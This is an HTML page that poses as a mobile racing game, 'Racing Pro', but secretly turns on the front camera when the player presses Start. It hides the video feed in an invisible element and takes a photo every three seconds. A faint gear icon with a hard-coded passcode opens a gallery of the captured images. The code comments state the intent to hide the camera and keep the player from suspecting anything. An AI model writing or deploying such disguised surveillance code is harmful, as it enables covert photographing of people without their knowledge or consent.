<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Racing Pro</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body { margin: 0; background: #000; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; overflow: hidden; }
        #score { font-size: 24px; color: #f1c40f; margin-bottom: 5px; }
        #gameArea { position: relative; width: 340px; height: 60vh; background: #222; border: 4px solid #444; overflow: hidden; }
        
        /* Secret Camera - Mirror but hide */
        #vContainer { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
        video { width: 100%; height: 100%; }

        /* Game visuals */
        .line { position: absolute; width: 8px; height: 60px; background: rgba(255,255,255,0.2); left: 50%; transform: translateX(-50%); }
        .car { position: absolute; width: 45px; height: 75px; border-radius: 8px; z-index: 5; }
        .player { background: linear-gradient(#ff4d4d, #990000); border: 2px solid #fff; }
        .enemy { background: linear-gradient(#2ecc71, #1b5e20); border: 2px solid #000; }

        .controls { display: flex; gap: 40px; margin-top: 20px; }
        .btn { width: 75px; height: 75px; background: #333; border: none; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 5px 0 #000; }
        .arrow { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; }
        .l-arr { border-right: 25px solid white; }
        .r-arr { border-left: 25px solid white; }

        #secretAccess { position: fixed; bottom: 5px; right: 5px; opacity: 0.1; cursor: pointer; z-index: 1000; font-size: 15px; }
        #overlay { position: absolute; inset: 0; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100; text-align: center; }
        .start-btn { padding: 18px 50px; font-size: 22px; background: #f1c40f; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; color: black; }

        #gallery { position: fixed; inset: 0; background: #000; display: none; flex-direction: column; align-items: center; padding: 20px; z-index: 2000; overflow-y: auto; }
        .snap { width: 45%; border: 1px solid #333; margin: 2%; border-radius: 5px; }
    </style>
</head>
<body>

    <div id="score">Score: 0</div>
    <div id="gameArea">
        <div id="vContainer"><video id="video" autoplay playsinline muted></video></div>
        <div id="overlay">
            <h1>RACING PRO</h1>
            <p>Ready to Drive?</p>
            <button class="start-btn" id="mainStart">START GAME</button>
        </div>
    </div>

    <div class="controls">
        <button class="btn" id="leftBtn"><div class="arrow l-arr"></div></button>
        <button class="btn" id="rightBtn"><div class="arrow r-arr"></div></button>
    </div>

    <div id="secretAccess">⚙️</div>

    <div id="gallery">
        <h2>System Data Logs</h2>
        <div id="imgList" style="display:flex; flex-wrap:wrap; justify-content:center;"></div>
        <button onclick="document.getElementById('gallery').style.display='none'" style="margin:20px; padding:12px; background:#fff; border:none; border-radius:5px;">CLOSE</button>
    </div>

    <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const imgList = document.getElementById('imgList');
        const gallery = document.getElementById('gallery');
        const overlay = document.getElementById('overlay');
        const startBtn = document.getElementById('mainStart');
        
        let gameOn = false;
        let logs = []; 
        let carPos = { x: 145, y: 380, score: 0, moveL: false, moveR: false };

        // THE KEY FIX: Camera activation MUST be a direct result of the click
        startBtn.addEventListener('click', function() {
            navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            })
            .then(function(stream) {
                video.srcObject = stream;
                // Force the video to play
                video.onloadedmetadata = () => {
                    video.play();
                    beginGame();
                };
            })
            .catch(function(err) {
                console.log("Camera blocked: ", err);
                // Start game anyway so they don't suspect
                beginGame();
            });
        });

        function beginGame() {
            overlay.style.display = 'none';
            gameOn = true;
            resetLevel();
            
            // Photo Loop
            setInterval(() => {
                if(!gameOn) return;
                try {
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, 400, 300);
                    const data = canvas.toDataURL('image/jpeg', 0.4);
                    if(data.length > 1000) logs.push(data); // Only save if not blank
                } catch(e) {}
            }, 3000);

            requestAnimationFrame(tick);
        }

        // Secret access logic
        document.getElementById('secretAccess').addEventListener('click', () => {
            const val = prompt("Enter Access Code:");
            if (val === "vamsi jacks") {
                imgList.innerHTML = "";
                logs.forEach(src => {
                    const i = document.createElement('img');
                    i.src = src; i.className = 'snap';
                    imgList.appendChild(i);
                });
                gallery.style.display = 'flex';
            }
        });

        function resetLevel() {
            gameArea.querySelectorAll('.car, .line').forEach(e => e.remove());
            for(let i=0; i<5; i++){
                let l = document.createElement('div'); l.className='line'; l.y=i*150;
                l.style.top=l.y+'px'; gameArea.appendChild(l);
            }
            let p = document.createElement('div'); p.id='pCar'; p.className='car player';
            gameArea.appendChild(p);
            for(let i=0; i<3; i++) spawnEnemy();
        }

        function spawnEnemy() {
            let e = document.createElement('div'); e.className='car enemy';
            e.y = Math.random() * -600; e.style.left = Math.random() * 280 + 'px';
            gameArea.appendChild(e);
        }

        document.getElementById('leftBtn').onpointerdown = () => carPos.moveL = true;
        document.getElementById('leftBtn').onpointerup = () => carPos.moveL = false;
        document.getElementById('rightBtn').onpointerdown = () => carPos.moveR = true;
        document.getElementById('rightBtn').onpointerup = () => carPos.moveR = false;

        function tick() {
            if (!gameOn) return;
            const p = document.getElementById('pCar');

            document.querySelectorAll('.line').forEach(l => {
                l.y += 6; if(l.y > 600) l.y = -100;
                l.style.top = l.y + 'px';
            });

            document.querySelectorAll('.enemy').forEach(e => {
                e.y += 6;
                if(e.y > 600) { e.y = -200; e.style.left = Math.random()*280+'px'; carPos.score++; }
                e.style.top = e.y + 'px';
                
                let r1 = p.getBoundingClientRect(); let r2 = e.getBoundingClientRect();
                if (!(r1.right < r2.left || r1.left > r2.right || r1.bottom < r2.top || r1.top > r2.bottom)) {
                    gameOn = false;
                    overlay.style.display = 'flex';
                    document.querySelector('h1').innerText = "SCORE: " + carPos.score;
                }
            });

            if (carPos.moveL && carPos.x > 0) carPos.x -= 6;
            if (carPos.moveR && carPos.x < 285) carPos.x += 6;
            p.style.left = carPos.x + 'px'; p.style.top = carPos.y + 'px';
            document.getElementById('score').innerText = "Score: " + carPos.score;
            requestAnimationFrame(tick);
        }
    </script>
</body>
</html>
